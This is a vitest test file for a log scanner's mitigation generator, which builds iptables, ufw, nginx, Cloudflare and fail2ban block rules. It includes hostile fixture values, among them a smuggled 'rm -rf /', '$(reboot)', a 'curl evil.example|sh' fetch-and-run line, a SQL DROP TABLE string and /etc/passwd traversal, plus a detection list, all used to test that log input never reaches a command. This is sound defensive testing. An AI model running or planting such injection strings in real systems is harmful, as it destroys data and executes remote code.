import { describe, expect, it } from 'vitest';

import { parseLines } from '../../core/basicParse';
import { buildMitigation, MAX_BLOCKED_ADDRESSES, type MitigationSnippet } from './mitigation';
import { scanLines } from './scanLines';
import type { ScanResult } from './types';

function access(address: string, target: string, agent = 'Mozilla/5.0'): string {
  return `${address} - - [03/Nov/2026:10:00:00 +0000] "GET ${target} HTTP/1.1" 404 0 "-" "${agent}"`;
}

function mitigationFor(rawLines: string[]): MitigationSnippet[] {
  return buildMitigation(scanLines(parseLines(rawLines.join('\n'))));
}

function code(snippets: MitigationSnippet[], id: MitigationSnippet['id']): string {
  return snippets.find((snippet) => snippet.id === id)?.code ?? '';
}

describe('buildMitigation', () => {
  it('is empty when nothing was found', () => {
    expect(mitigationFor([access('198.51.100.1', '/')])).toEqual([]);
  });

  it('writes a block command for every offending address in each tool', () => {
    const snippets = mitigationFor([
      access('203.0.113.9', '/.env'),
      access('2001:db8::7', '/.env'),
    ]);
    const iptables = code(snippets, 'iptables').split('\n');
    expect(iptables).toHaveLength(2);
    expect(iptables).toContain('iptables -A INPUT -s 203.0.113.9 -j DROP');
    expect(iptables).toContain('ip6tables -A INPUT -s 2001:db8::7 -j DROP');
    expect(code(snippets, 'ufw').split('\n').sort()).toEqual([
      'ufw deny from 2001:db8::7',
      'ufw deny from 203.0.113.9',
    ]);
    expect(code(snippets, 'nginx').split('\n').sort()).toEqual([
      'deny 2001:db8::7;',
      'deny 203.0.113.9;',
    ]);
    expect(code(snippets, 'cloudflareAddresses')).toContain('(ip.src eq 203.0.113.9)');
    expect(code(snippets, 'cloudflareAddresses')).toContain('(ip.src eq 2001:db8::7)');
    expect(code(snippets, 'cloudflareAddresses')).toContain(' or ');
  });

  it('writes Cloudflare pattern rules from fixed constants only', () => {
    const snippets = mitigationFor([
      access('203.0.113.9', '/.env'),
      access('203.0.113.9', '/x?id=1+union+select+1', 'sqlmap/1.7'),
    ]);
    const rule = code(snippets, 'cloudflarePatterns');
    expect(rule).toContain('(http.request.uri.path contains "/.env")');
    expect(rule).toContain('(lower(http.request.uri.query) contains "union select")');
    expect(rule).toContain('(lower(http.user_agent) contains "sqlmap")');
  });

  it('writes a fail2ban filter and jail for probed paths and failed logins', () => {
    const failures = Array.from({ length: 5 }, () => 'Failed password for root from 203.0.113.9');
    const snippets = mitigationFor([access('203.0.113.9', '/wp-login.php'), ...failures]);
    const fail2ban = code(snippets, 'fail2ban');
    expect(fail2ban).toContain('[loglens-probes]');
    expect(fail2ban).toContain(String.raw`/wp-login\.php`);
    expect(fail2ban).toContain('(?:401|403)');
  });

  it('keeps loopback addresses out', () => {
    const snippets = mitigationFor([access('127.0.0.1', '/.env')]);
    expect(code(snippets, 'iptables')).toBe('');
    expect(code(snippets, 'cloudflarePatterns')).toContain('/.env');
  });

  it('caps the number of addresses', () => {
    const lines = Array.from({ length: MAX_BLOCKED_ADDRESSES + 20 }, (_unused, position) =>
      access(`198.51.${Math.floor(position / 200)}.${(position % 200) + 1}`, '/.env'),
    );
    const iptables = code(mitigationFor(lines), 'iptables');
    expect(iptables.split('\n')).toHaveLength(MAX_BLOCKED_ADDRESSES);
  });
});

describe('text from a log never reaches a command', () => {
  const hostile = [
    access('1.2.3.4; rm -rf /', '/.env'),
    `1.2.3.4;rm -rf / - - "GET /.env HTTP/1.1" 404 0 "-" "x"`,
    'client_ip=$(curl evil.example|sh) GET /.env',
    'GET /\'`rm -rf /`"/../../etc/passwd HTTP/1.1 from 203.0.113.9',
    access('203.0.113.9', "/wp-login.php'; DROP TABLE x; --", 'sqlmap"; id #'),
  ];

  it('contains none of the hostile fragments in any snippet', () => {
    const output = mitigationFor(hostile)
      .map((snippet) => snippet.code)
      .join('\n');
    for (const fragment of [
      'rm -rf',
      'curl',
      'evil.example',
      'DROP TABLE',
      '`',
      '$(',
      'id #',
      "'",
    ]) {
      expect(output, fragment).not.toContain(fragment);
    }
  });

  it('refuses addresses that fail the strict check even if a result carries them', () => {
    const forged: ScanResult = {
      scannedLines: 1,
      groups: [],
      highSignals: 0,
      highAddresses: [],
      offenders: [
        { address: '1.2.3.4; rm -rf /', count: 9 },
        { address: '999.1.1.1', count: 8 },
        { address: '$(reboot)', count: 7 },
        { address: '203.0.113.9', count: 1 },
      ],
    };
    const snippets = buildMitigation(forged);
    expect(code(snippets, 'iptables')).toBe('iptables -A INPUT -s 203.0.113.9 -j DROP');
    expect(snippets.map((snippet) => snippet.code).join('\n')).not.toMatch(/rm -rf|reboot|999/);
  });

  it('uses only valid addresses for the offenders it finds in hostile lines', () => {
    const result = scanLines(parseLines(hostile.join('\n')));
    for (const entry of result.offenders) {
      expect(entry.address).toMatch(/^[0-9a-f.:]+$/);
    }
  });
});
